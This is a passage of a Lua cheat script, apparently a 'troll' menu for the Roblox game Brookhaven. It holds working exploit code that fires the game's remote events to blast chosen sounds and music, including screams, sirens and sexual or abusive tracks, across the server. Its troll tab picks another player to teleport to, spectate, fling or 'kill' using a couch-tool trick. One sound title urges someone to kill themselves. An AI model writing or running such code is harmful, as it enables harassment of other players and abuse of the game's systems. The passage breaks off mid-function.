        {name = "mita sequer que eu too uma", id = "94889439372168"},
        {name = "Hoje vou ser tua mulher e tu", id = "90844637105538"},
        {name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582"},
        {name = "miau", id = "131804436682424"},
        {name = "skibidi", id = "128771670035179"},
        {name = "BIRULEIBI", id = "121569761604968"},
        {name = "biseabesjnjkasnakjsndjkafb", id = "133106998846260"},
        {name = "vai corinthians!!....", id = "127012936767471"},
        {name = "my sigman", id = "103431815659907"},
        {name = "mama", id = "106850066985594"},
        {name = "OH MY GOD", id = "73349649774476"},
        {name = "aahhh plankton meme", id = "95982351322190"},
        {name = "CHINABOY", id = "84403553163931"},
        {name = "PASTOR MIRIM E A LÃNGUA DOS ANJOS", id = "71153532555470"},
        
        {name = "Sai d3sgraÃ§@", id = "106973692977609"},
        
        {name = "opa salve tudo bem?", id = "80870678096428"},
        {name = "OLHA O CARRO DO DANONE", id = "110493863773948"},
        {name = "NÃ£oooo, NÃ£oooo, NÃ£ooo!!!!!", id = "95825536480898"},
        {name = "UM PÃ DE SIRIGUELA KK", id = "112804043442210"},
        {name = "e o carro da pamonha", id = "94951629392683"},
        {name = "BOM DIAAAAAAAAAA", id = "136579844511260"},
        {name = "ai-meu-chiclete", id = "92911732806153"},
        {name = "posso te ligar ou tua mulher...", id = "103211341252816"},
        {name = "Boa chi joga muito cara", id = "110707564387669"},
        {name = "Oqueee meme", id = "120092799810101"},
        {name = "kkk muito fei", id = "79241074803021"},
        {name = "lula cade o ze gotinha", id = "86012585992725"},
        {name = "morreu", id = "8872409975"},
        {name = "a-pia-ta-cheia-de-louca", id = "98076927129047"},
        {name = "Mahito killSong", id = "128669424001766"},
        {name = "Sucumba", id = "7946300950"},
        {name = "nem clicou o thurzin", id = "84428355313544"},
        {name = "fiui OLHA MENSAGEM", id = "121668429878811"},
        {name = "tooomeee", id = "128319664118768"},
        {name = "risada de ladrao", id = "133065882609605"},
        {name = "E o PIX nada ainda", id = "113831443375212"},
        {name = "Vo nada vo nada", id = "89093085290586"},
        {name = "Eli gosta", id = "105012436535315"},
        {name = "um cavalo de tres pernas?", id = "8164241439"},
        {name = "voces sao um bado de fdp", id = "8232773326"},
        {name = "HAHA TROLLEI ATÃ VOCÃ", id = "7021794555"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        
        

        {name = "Calaboca Kenga", id = "86494561679259"},
        {name = "alvincut", id = "88788640194373"},
        {name = "e a risada faz como?", id = "140713372459057"},
        {name = "voce deve se m@t4", id = "100227426848009"},
        {name = "receba", id = "94142662616215"},
        {name = "UUIIII", id = "73210569653520"},
        



        {name = "sai", id = "121169949217007"},
        {name = "risada boa dms", id = "127589011971759"},
        {name = "vacilo perna de pau", id = "106809680656199"},
        {name = "gomo gomo no!!!", id = "137067472449625"},
        {name = "arroto", id = "140203378050178"},
        {name = "iraaaa", id = "136752451575091"},
        {name = "nÃ£o fica se achando muito nÃ£o", id = "101588606280167"},
       
        {name = "WhatsApp notificaÃ§aoV1", id = "107004225739474"},
        {name = "WhatsApp notificaÃ§aoV2", id = "18850631582"},
        {name = "SamsungV1", id = "123767635061073"},
        {name = "SamsungV2", id = "96579234730244"}, 
        {name = "Shiiii", id = "120566727202986"},
        {name = "ai_tomaa miku", id = "139770074770361"},
        {name = "Miku Miku", id = "72812231495047"},
        {name = "kuru_kuru", id = "122465710753374"},
        {name = "PM ROCAM", id = "96161547081609"},
        {name = "cavalo!!", id = "78871573440184"},
        {name = "deixa os garoto brinca", id = "80291355054807"},
        {name = "flamengo", id = "137774355552052"},
        {name = "sai do mei satnas", id = "127944706557246"},
        {name = "namoral agora e a hora", id = "120677947987369"},
        {name = "n pode me chutar pq seu celebro e burro", id = "82284055473737"},
        {name = "vc ta fudido vou te pegar", id = "120214772725166"},
        {name = "deley", id = "102906880476838"},
        {name = "Tu e um beta", id = "130233956349541"},
        {name = "Porfavor n tira eu nao", id = "85321374020324"},
        {name = "OlÃ¡ beleza vc pode me dÃ¡ muitos", id = "74235334504693"},
        {name = "Discord sus", id = "122662798976905"},
        {name = "rojao apito", id = "6549021381"},
        {name = "off", id = "1778829098"},
        {name = "Kazuma kazuma", id = "127954653962405"},
        {name = "sometourado", id = "123592956882621"},
        {name = "Estouradoespad", id = "136179020015211"},
        {name = "Alaku bommm", id = "110796593805268"},
        {name = "busss", id = "139841197791567"},
        {name = "Estourado wItb", id = "137478052262430"},
        {name = "sla", id = "116672405522828"},
        {name = "HA HA HA", id = "138236682866721"}
    }
}, "pankapakan")



local Section = Tab7:AddSection({" wreak havoc or effect on server"})

-- Dropdown "Efeito/Terror"
createSoundDropdown("Select a terror or effect", {
    ["efeito/terror"] = {
        {name = "jumpscar", id = "91784486966761"},
        {name = "n se preocupe", id = "87041057113780"},
        {name = "eles estao todos mortos", id = "70605158718179"},

        {name = "gritoestourado", id = "7520729342"},
        {name = "gritomedo", id = "113029085566978"},
        {name = "Nukesiren", id = "9067330158"},
        {name = "nuclear sirenv2", id = "675587093"},
        {name = "Alertescola", id = "6607047008"},
        {name = "Memealertsiren", id = "8379374771"},
        {name = "sirenv3", id = "6766811806"},
        {name = "Alarm estourAAAA...", id = "93354528379052"},
        {name = "MegaMan Alarm", id = "1442382907"},
        {name = "Alarm bookhaven", id = "1526192493"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},



        {name = "alet malaysia", id = "7714172940"},
        {name = "Risada", id = "79191730206814"},
        {name = "Hahahah", id = "90096947219465"},
        {name = "scream", id = "314568939"},
        {name = "Terrified meme scream", id = "5853668794"},
        {name = "Sonic.exe Scream Effect", id = "146563959"},
        {name = "Demon Scream", id = "2738830850"},
        {name = "SCP-096 Scream (raging)", id = "343430735"},
        {name = "Nightmare Yelling Bursts", id = "9125713501"},
        {name = "HORROR SCREAM 07", id = "9043345732"},
        {name = "Female Scream Woman Screams", id = "9114397912"},
        {name = "Scream1", id = "1319496541"},
        {name = "Scream2", id = "199978176"},
        {name = "scary maze scream", id = "270145703"},
        {name = "SammyClassicSonicFan's Scream", id = "143942090"},
        {name = "FNAF 2 Death Scream", id = "1572549161"},
        {name = "cod zombie scream", id = "8566359672"},
        {name = "Slendytubbies- CaveTubby Scream", id = "1482639185"},
        {name = "FNAF 2 Death Scream", id = "5537531920"},
        {name = "HORROR SCREAM 15", id = "9043346574"},
        {name = "Jumpscare Scream", id = "6150329916"},
        {name = "FNaF: Security Breach", id = "2050522547"},
        {name = "llllllll", id = "5029269312"},
        {name = "loud jumpscare", id = "7236490488"},
        {name = "fnaf", id = "6982454389"},
        {name = "Pinkamena Jumpscare 1", id = "192334186"},
        {name = "Ennard Jumpscare 2", id = "629526707"},
        {name = "a sla medo dino", id = "125506416092123"},
        {name = "Backrooms Bacteria Pitfalls ", id = "81325342128575"},
        
        {name = "error Infinite", id = "3893790326"},
        {name = "Screaming Meme", id = "107732411055226"},
        {name = "Jumpscare - SCP CB", id = "97098997494905"},
        {name = "mirror jumpscare", id = "80005164589425"},
        {name = "PTLD-39 Jumpscare", id = "5581462381"},
        {name = "jumpscare:Play()", id = "121519648044128"},
        {name = "mimic jumpscare", id = "91998575878959"},
        {name = "DOORS Glitch Jumpscare Sound", id = "96377507894391"},
        {name = "FNAS 4 Nightmare Mario", id = "99804224106385"},
        {name = "Death House I Jumpscare Sound", id = "8151488745"},
        {name = "Shinky Jumpscare", id = "123447772144411"},
        {name = "FNaTI Jumpscare Oblitus casa", id = "18338717319"},
        {name = "fnaf jumpscare loadmode", id = "18911896588"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "jumpscar")



---------------------------------------------------------------------------------------------------------------------------------
                                          -- === Tab 8: Troll Musica === --
---------------------------------------------------------------------------------------------------------------------------------

local function tocarMusica(id)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- RÃ¡dio (ToolMusicText)
    local argsRadio = {
        [1] = "ToolMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack(argsRadio))
    
    -- Casa (PickHouseMusicText)
    local argsCasa = {
        [1] = "PickHouseMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(argsCasa))

    -- Carro (PickingCarMusicText)
    local argsCarro = {
        [1] = "PickingCarMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(argsCarro))

    -- Scooter (PickingScooterMusicText)
    local argsScooter = {
        [1] = "PickingScooterMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(argsScooter))
end

local function isValidMusicId(value)
    return value and value ~= "" and value ~= "Option 1" and not value:match("novas musica adds") and not value:match("musica brasil") and not value:match("musica do meu interece") and not value:match("musica dls por elas") and not value:match("meme abaixo") and not value:match("estourada")
end

Tab8:AddTextBox({
    Name = "Music ID",
    PlaceholderText = "Type ID and press Enter",
    Callback = function(value)
        if value and value ~= "" then
            tocarMusica(tostring(value))
        end
    end
})

-- Dropdowns para Tab8
local function createMusicDropdown(title, musicOptions, defaultOption)
    local musicNames = {}
    local categoryMap = {}
    for category, sounds in pairs(musicOptions) do
        for _, music in ipairs(sounds) do
            if music.name ~= "" then
                table.insert(musicNames, music.name)
                categoryMap[music.name] = {id = music.id, category = category}
            end
        end
    end

    local function playMusic(soundId)
        tocarMusica(tostring(soundId)) -- Usa a funÃ§Ã£o tocarMusica para tocar em todos os contextos
    end

    Tab8:AddDropdown({
        Name = title,
        Description = "all",
        Default = defaultOption,
        Multi = false,
        Options = musicNames,
        Callback = function(selectedSound)
            if selectedSound and categoryMap[selectedSound] then
                local soundId = categoryMap[selectedSound].id
                if soundId and soundId ~= "" and soundId ~= "4354908569" then
                    playMusic(soundId)
                end
            end
        end
    })
end

-- Dropdown "ForrÃ³"
createMusicDropdown("ForrÃ³", {
    ["forro"] = {
        {name = "forrÃ³ ja cansou", id = "74812784884330"},
        {name = "lenbro ate hoje", id = "71531533552899"},
        {name = "escolha certa", id = "107088620814881"},
        {name = "forrÃ³ da rezenha", id = "120973520531216"},
        {name = "forrÃ³ dudu", id = "74404168179733"},
        {name = "forrÃ³ sao joao", id = "106364874935196"},
        {name = "forrÃ³ engraÃ§ado paia", id = "76524290482399"},
        {name = "100% forro vaquejada", id = "92295159623916"},
        
        {name = "PASTOR MIRIM E A LÃNGUA DOS ANJOS", id = "71153532555470"},
        {name = "PARA NÃO ESQUECER QUEM SOMOS", id = "88937498361674"},
        {name = "Uno zero", id = "112959083808887"},
        {name = "Iate do neymar", id = "135738534706063"},
        {name = "Batidao na aldeia", id = "79953696595578"},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "MÃºsicas e Memes AleatÃ³rio"
createMusicDropdown("MÃºsicas e Memes AleatÃ³rio", {
    ["forro"] = {
        {name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189"}, 
        {name = "Meu corpo, minhas regras", id = "127587901595282"},
        {name = "$$$$gg$$$$gg", id = "137471775091253"},
        {name = "Megalovania but its only the melodies", id = "104500091160463"},
        {name = "androphono strikes back", id = "78312089943968"},
        {name = "Bamm Bamm", id = "128730685516895"},
        {name = "chupa cabra", id = "132890273173295"},
        {name = "longe de mais", id = "124478512057763"},
        {name = "Garoto de Copacabana", id = "135648634110254"},
        {name = "CELL!", id = "117634275895085"},
        {name = "Boa vibe em Ubatuba", id = "139059061493558"},
        {name = "SLIP AWAY", id = "126152928520174"},
        {name = "Alone in Motion", id = "122379348696948"},
        {name = "Fade Away", id = "81002139735874"},
        {name = "Wounds & Wishes", id = "109347979566607"},
        {name = "AscensÃ£o do Monarca", id = "101864243033211"},
        {name = "carro do ovo", id = "3148329638"},
        {name = "ingles bus (fling ou kill bus)", id = "123268013026823"},
        {name = "MIKU MIKU HATSUNE", id = "112783541496955"},
        {name = "Five Nights at Freddy's", id = "110733765539890"},
        {name = "Rat Dance", id = "133496635668044"},
        {name = "Escalando a SeleÃ§Ã£o Brasileira para a Copa", id = "116546457407236"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Funk"
createMusicDropdown("Funk", {
    ["Funk"] = {
        {name = "sua mulher funk", id = "90844637105538"},
        {name = "fuga na viatura", id = "131891110268352"},
        {name = "funkphonk fumando verde", id = "112143944982807"},
        {name = "cauma xmara", id = "95664293972405"},
        {name = "que que sharke", id = "129546408528391"},
        {name = "Il Cacto Hipopotamo FUNK", id = "104491656009142"},
        {name = "Espressora Signora FUNK", id = "123394392737234"},
        {name = "trippi troop funk", id = "73049389767013"},
        {name = "bombini funkphonk", id = "88814770244609"},
        {name = "pre treino", id = "136869502216760"},
        {name = "CVRL", id = "124244582950595"},
        {name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701"},
        {name = "DanÃ§a do Canguru (Pke Gaz1nh)", id = "86876136192157"},
        {name = "espere 30segundos!! Ondas sonoras", id = "127757321382838"},
        {name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098"},
        {name = "Manda o papo (NGI)", id = "132642647937688"},
        {name = "Viver bem", id = "82805460494325"},
        {name = "Faixa estronda", id = "121187736532042"},
        {name = "Ritmo Pixelado", id = "93928823862203"},
        {name = "Viagem Sonora", id = "79349174602261"},
        {name = "Melodia Virtual", id = "139147474886402"},
        {name = "Melodia Serena", id = "97011217688307"},
        {name = "SENTA", id = "124085422276732"},
        {name = "TUNG TUNG TUNG TUNG SAHUR PHONK BRASILEIRO", id = "120353876640055"},
        {name = "crazy-lol", id = "106958630419629"},
        {name = "V7", id = "80348640826643"},
        {name = "UIUAH", id = "82894376737849"},
        {name = "meta ritmo", id = "110091098283354"},
        {name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915"},
        {name = "haha (NGI)", id = "122114766584918"},
        {name = "DO PO", id = "114207745067816"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Phonk"
createMusicDropdown("Phonk", {
    ["phonk"] = {
        {name = "wyles", id = "85385155970460"},
        {name = "phonk kawai", id = "91502410121438"},
        {name = "querendo da a bucet@", id = "72720721570850"},
        {name = "vem no pocpoc", id = "102333419023382"},
        {name = "tatiu wim", id = "122871512353520"},
        {name = "novinha sapeca", id = "111668097052966"},
        {name = "novinha representa", id = "93786060174790"},
        {name = "phonk1", id = "77501611905348"},
        {name = "phonk2", id = "126887144190812"},
        {name = "phonk osadia", id = "88033569921555"},
        {name = "phonk sarra", id = "132436320685732"},
        {name = "relaionamento sem crush", id = "105832154444494"},
        {name = "phonk3", id = "90323407842935"},
        {name = "novinha danÃ§apanpa", id = "132245626038510"},
        {name = "phonk sexoagreÃ§ivo", id = "111995323199676"},
        {name = "phonk4", id = "115016589376700"},
        {name = "phonk5", id = "118740708757685"},
        {name = "phonk6", id = "139435437308948"},
        {name = "phonk chapaquente", id = "109189438638906"},
        {name = "phonk rajada", id = "105126065014034"},
        {name = "rede globo", id = "138487820505005"},
        {name = "phonk indiano", id = "87968531262747"},
        {name = "vapo do vapo", id = "106317184644394"},
        {name = "tutatatutata", id = "112068892721408"},
        {name = "phonk slower", id = "122852029094656"},
        {name = "phonk9", id = "91760524161503"},
        {name = "phonk10", id = "73140398421340"},
        {name = "phonk11", id = "137962454483542"},
        {name = "phonk12", id = "84733736048142"},
        {name = "phonk13", id = "106322173003761"},
        {name = "phonk14", id = "94604796823780"},
        {name = "phonk15", id = "118063577904953"},
        {name = "phonk16", id = "115567432786512"},
        {name = "phonk toq", id = "71304501822029"},
        {name = "phonk hey", id = "132218979961283"},
        {name = "phonk17", id = "102708912256857"},
        {name = "phonk18", id = "140642559093189"},
        {name = "phonk neve", id = "13530439660"},
        {name = "phonk19", id = "87863924786534"},
        {name = "phonk20", id = "133135085604736"},
        {name = "phonk lento", id = "97258811783169"},
        {name = "phonk21", id = "92308400487695"},
        {name = "tipo wym", id = "88064647826500"},
        {name = "estouradassa1", id = "92175624643620"},
        {name = "estouradassa2", id = "108099943758978"},
        {name = "Naaaaa", id = "109784877184952"},
        {name = "trem", id = "114608169341947"},
        {name = "eoropa", id = "111346133543699"},
        {name = "atimosphekika", id = "77857496821844"},
        {name = "phonk ALL THE TIME", id = "123809083385992"},
        {name = "Lifelong Memory", id = "81929101024622"},
        {name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776"},
        {name = "à¸ªà¸§à¸±à¸ªà¸à¸µà¸à¸à¹à¸à¸¢ v2", id =  "118225359190317"},
        {name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657"},
        {name = "SARRA FUNK", id = "96249826607044"},
        {name = "Catuquanvan", id = "88038595663211"},
        {name = "F-D-1 (slowed)", id = "124958445624871"},
        {name = "Sucessagem", id = "88551699463723"},
        {name = "ILOVE phonksla", id = "82148953715595"},
        {name = "SPEED SLIDE", id = "118959437310311"},
        {name = "TOMA FUNK PHONK", id = "126291069838831"},
        {name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279"},
        {name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007"},
        {name = "BALA SELVAGEM!", id = "96180057167470"},
        {name = "Luz <3", id = "74281337525581"},
        {name = "COMO TU", id = "86928685812280"},
        {name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294"},
        {name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422"},
        {name = "YO DE TI", id = "125181345407169"},
        {name = "Beauty, (Phonk), Super sped up", id = "71123357599630"},
        {name = "MONTAGEM BOOMBOX DO MALA FUNK", id = "86537505028256"},
        {name = "BRAZIL DO FUNK", id = "133498554139200"},
        {name = "BRR BRR PATAPIM FUNK", id = "117170901476451"},
        {name = "MONTAGEM TERRA BELA FUNK", id = "134770548505933"},
        {name = "FUNK DO RAVE 1.0", id = "137135395010424"},
        
        {name = " Portao Funk", id = "70900514961735"},
        {name = " EspaÃ§o Funk", id = "110519906029322"},
        {name = " FUTABA", id = "91834632690710"},
        {name = " MelÃ³dica ExplosÃ£o De Melodia", id = "98371771055411"},
        {name = " RASGO", id = "98267810117949"},
        {name = " HIPNOTIZA", id = "117668905142866"},
        {name = "CRISTAL NOTURNO", id = "103695219371872"},
        {name = " SKY HIGH", id = "123517126955383"},
        {name = "MIKU top", id = "102771149931910"},
        {name = " ACABU SO FUNK", id = "127870227978818"},
        {name = "CREATIFE FUNK", id = "130525387712209"},
        {name = "GOTH FUNK", id = "97662362226511"},
        {name = "PORTUGESE FUNK", id = "125858109122379"},
        {name = "SUBURBANA", id = "139825057894568"},
        {name = "ESPERA LA NOCHE FUNK", id = "139768056738146"},
        {name = "SIN PERMISO FUNK", id = "92572896648274"},
        {name = "MONTAGEM DACE RAT", id = "98711199754623"},
        {name = " LOVELY FUNK", id = "130633105268814"},
        {name = "STORYMODECOOL", id = "87115976125426"},
        {name = "BLACK COFFEE FUNK", id = "82705137378395"},
        {name = "KOBALT", id = "79381341943021"},
        {name = " andante bacterial", id = "105882833374061"},
        {name = "ANGEL Speed Up", id = "139593870988593"},
        {name = "LUTA ÃPICA", id = "73966367524216"},
        {name = "MALDITA", id = "133814632960968"},
        {name = "DA ZONA NTJ VERSON", id = "105770593501071"},
        {name = "HIPNOTIZA", id = "132015050363205"},
        {name = "MIDZUKI speed up", id = "129151948619922"},
        
        {name = "movimenta funk", id = "114994598691121"},
        {name = "CRISTAL", id = "103445348511856"},
        {name = "Letero funkphonk", id = "99409598156364"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

Tab8:AddButton({
    Name = "Stop",
    Description = "ALL music",
    Callback = function()
        tocarMusica("")
    end
})




---------------------------------------------------------------------------------------------------------------------------------
                                                   -- === Tab 9: troll === --
-----------------------------------------------------------------------------------------------------------------------------------
local vu358 = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
if vu358 then
    vu358 = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1n")
end
local vu359 = game:GetService("Players")
local vu360 = vu359.LocalPlayer
local vu361 = game:GetService("ReplicatedStorage")
local vu362 = game:GetService("VirtualInputManager")
local vu363 = game:GetService("RunService")
local vu364 = workspace.CurrentCamera
local vu365 = nil
getgenv().Target = nil
local vu366 = vu360.Character
local vu367
if vu366 then
    vu367 = vu366:WaitForChild("Humanoid")
else
    vu367 = vu366
end
local vu368
if vu366 then
    vu368 = vu366:WaitForChild("HumanoidRootPart")
else
    vu368 = vu366
end
local function vu371()
    local v369 = vu360.Character
    local v370 = v369 and (v369:FindFirstChild("Chaos.Couch") or vu360.Backpack:FindFirstChild("Chaos.Couch"))
    if v370 then
        v370:Destroy()
    end
    vu361:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end
vu360.CharacterAdded:Connect(function(p372)
    vu366 = p372
    vu367 = p372:WaitForChild("Humanoid")
    vu368 = p372:WaitForChild("HumanoidRootPart")
    vu371()
    vu367.Died:Connect(function()
        vu371()
    end)
end)
if vu367 then
    vu367.Died:Connect(function()
        vu371()
    end)
end
Tab10:AddSection({
    Name = "Troll Player"
})
local vu380 = Tab10:AddDropdown({
    Name = "Select Player",
    Options = (function()
        local v373 = vu359:GetPlayers()
        local v374, v375, v376 = ipairs(v373)
        local v377 = {}
        while true do
            local v378
            v376, v378 = v374(v375, v376)
            if v376 == nil then
                break
            end
            if v378 ~= vu360 then
                table.insert(v377, v378.Name)
            end
        end
        return v377
    end)(),
    Default = "",
    Callback = function(p379)
        vu365 = p379
        getgenv().Target = p379
        print("Jogador selecionado: " .. tostring(p379))
    end
})
Tab10:AddButton({
    Name = "Refresh Player List",
    Callback = function()
        local v381 = vu359:GetPlayers()
        local v382 = {}
        if vu380 and # v381 > 0 then
            local v383, v384, v385 = ipairs(v381)
            while true do
                local v386
                v385, v386 = v383(v384, v385)
                if v385 == nil then
                    break
                end
                if v386.Name ~= vu360.Name then
                    table.insert(v382, v386.Name)
                end
            end
            vu380:Set(v382)
            print("Player list updated: ", table.concat(v382, ", "))
            if vu365 and not vu359:FindFirstChild(vu365) then
                vu365 = nil
                getgenv().Target = nil
                vu380:SetValue("...")
                print("Selection reset, player no longer in server.")
            end
        else
            print("Error: Dropdown not found or no players available.")
        end
    end
})
Tab10:AddButton({
    Name = "Teleport to Player",
    Callback = function()
        if vu365 and vu359:FindFirstChild(vu365) then
            local v387 = vu360.Character
            if v387 then
                v387 = v387:FindFirstChild("HumanoidRootPart")
            end
            if v387 then
                local v388 = vu359:FindFirstChild(vu365)
                if v388 and v388.Character and v388.Character:FindFirstChild("HumanoidRootPart") then
                    v387.CFrame = v388.Character.HumanoidRootPart.CFrame
                else
                    print("Error: Target player not found or no HumanoidRootPart")
                end
            else
                warn("Error: Local player HumanoidRootPart not found")
            end
        else
            print("Error: Player not selected or does not exist")
            return
        end
    end
})
Tab10:AddToggle({
    Name = "Spectate Player",
    Default = false,
    Callback = function(pu389)
        local vu390 = workspace.CurrentCamera
        local function v394()
            if pu389 then
                local v391 = vu359:FindFirstChild(vu365)
                local v392 = v391 and v391.Character and v391.Character:FindFirstChild("Humanoid")
                if v392 then
                    vu390.CameraSubject = v392
                end
            else
                local v393 = vu360.Character and vu360.Character:FindFirstChild("Humanoid")
                if v393 then
                    vu390.CameraSubject = v393
                end
            end
        end
        if pu389 then
            if not getgenv().CameraConnection then
                getgenv().CameraConnection = vu363.Heartbeat:Connect(v394)
            end
        else
            if getgenv().CameraConnection then
                getgenv().CameraConnection:Disconnect()
                getgenv().CameraConnection = nil
            end
            v394()
        end
    end
})
Tab10:AddSection({
    Name = "Couch"
})
Tab10:AddButton({
    Name = "Kill Player",
    Callback = function()
        if vu365 then
            local vu395 = vu359:FindFirstChild(vu365)
            if vu395 and vu395.Character then
                local vu396 = vu360.Character
                if vu396 then
                    local vu397 = vu396:FindFirstChildOfClass("Humanoid")
                    local vu398 = vu396:FindFirstChild("HumanoidRootPart")
                    local v399 = vu395.Character
                    if v399 then
                        v399 = vu395.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if vu397 and (vu398 and v399) then
                        local vu400 = vu398.Position
                        local vu401 = Vector3.new(145.51, - 350.09, 21.58)
                        vu361:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
                        task.wait(0.2)
                        vu361.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                        task.wait(0.3)
                        local v402 = vu360.Backpack:FindFirstChild("Couch")
                        if v402 then
                            v402.Parent = vu396
                        end
                        task.wait(0.1)
                        vu362:SendKeyEvent(true, Enum.KeyCode.F, false, game)
                        task.wait(0.1)
                        vu397:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                        vu397.PlatformStand = false
                        vu364.CameraSubject = vu395.Character:FindFirstChild("Head") or (v399 or vu397)
                        local vu403 = Instance.new("BodyPosition")
                        vu403.Name = "BringPosition"
                        vu403.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        vu403.D = 10
                        vu403.P = 30000
                        vu403.Position = vu398.Position
                        vu403.Parent = v399
                        task.spawn(function()
                            local v404 = tick()
                            local v405 = 0
                            while tick() - v404 < 5 and (vu395 and vu395.Character) and vu395.Character:FindFirstChildOfClass("Humanoid") do
                                local v406 = vu395.Character:FindFirstChildOfClass("Humanoid")
                                if not v406 or v406.Sit then
                                    break
                                end
                                local v407 = vu395.Character.HumanoidRootPart
                                local v408 = v407.Position + v407.Velocity / 1.5
                                v405 = v405 + 50
                                vu398.CFrame = CFrame.new(v408 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(v405), 0, 0)
                                vu403.Position = vu398.Position + Vector3.new(2, 0, 0)
                                task.wait()
                            end
                            vu403:Destroy()
                            vu397:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                            vu397.PlatformStand = false
                            vu364.CameraSubject = vu397
                            local v409 = vu396
                            local v410, v411, v412 = pairs(v409:GetDescendants())
                            while true do
                                local v413
                                v412, v413 = v410(v411, v412)
                                if v412 == nil then
                                    break
                                end
                                if v413:IsA("BasePart") then
                                    v413.Velocity = Vector3.zero
                                    v413.RotVelocity = Vector3.zero
                                end
                            end
                            task.wait(0.1)
                            vu398.CFrame = CFrame.new(vu401)
                            task.wait(0.3)
                            local v414 = vu396:FindFirstChild("Couch")
                            if v414 then
                                v414.Parent = vu360.Backpack
                            end
                            task.wait(0.01)
                            vu361.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                            task.wait(0.2)
                            vu398.CFrame = CFrame.new(vu400)
                        end)
                    else
                        warn("Erro: Componentes necess\195\161rios n\195\163o encontrados")
                    end
                else
                    warn("Erro: Personagem do jogador local n\195\163o encontrado")
                    return
                end
            else
                warn("Erro: Jogador alvo n\195\163o encontrado ou sem personagem")
                return
            end
        else
            warn("Erro: Nenhum jogador selecionado")
            return
        end
    end
})
Tab10:AddButton({
    Name = "Puxar Player",
    Callback = function()
        if vu365 then
            local vu415 = vu359:FindFirstChild(vu365)
            if vu415 and vu415.Character then
                local vu416 = vu360.Character
                if vu416 then
                    local vu417 = vu416:FindFirstChildOfClass("Humanoid")
                    local vu418 = vu416:FindFirstChild("HumanoidRootPart")
                    local v419 = vu415.Character
                    if v419 then
                        v419 = vu415.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if vu417 and (vu418 and v419) then
                        local vu420 = vu418.Position
                        vu361:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
                        task.wait(0.2)
                        vu361.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                        task.wait(0.3)
                        local v421 = vu360.Backpack:FindFirstChild("Couch")
                        if v421 then
                            v421.Parent = vu416
                        end
                        task.wait(0.1)
                        vu362:SendKeyEvent(true, Enum.KeyCode.F, false, game)
                        task.wait(0.1)
                        vu417:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                        vu417.PlatformStand = false
                        vu364.CameraSubject = vu415.Character:FindFirstChild("Head") or (v419 or vu417)
                        local vu422 = Instance.new("BodyPosition")
                        vu422.Name = "BringPosition"
                        vu422.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        vu422.D = 10
                        vu422.P = 30000
                        vu422.Position = vu418.Position
                        vu422.Parent = v419
                        task.spawn(function()
                            local v423 = tick()
                            local v424 = 0
                            while tick() - v423 < 5 and (vu415 and vu415.Character) and vu415.Character:FindFirstChildOfClass("Humanoid") do
                                local v425 = vu415.Character:FindFirstChildOfClass("Humanoid")
                                if not v425 or v425.Sit then
                                    break
                                end
                                local v426 = vu415.Character.HumanoidRootPart
                                local v427 = v426.Position + v426.Velocity / 1.5
                                v424 = v424 + 50
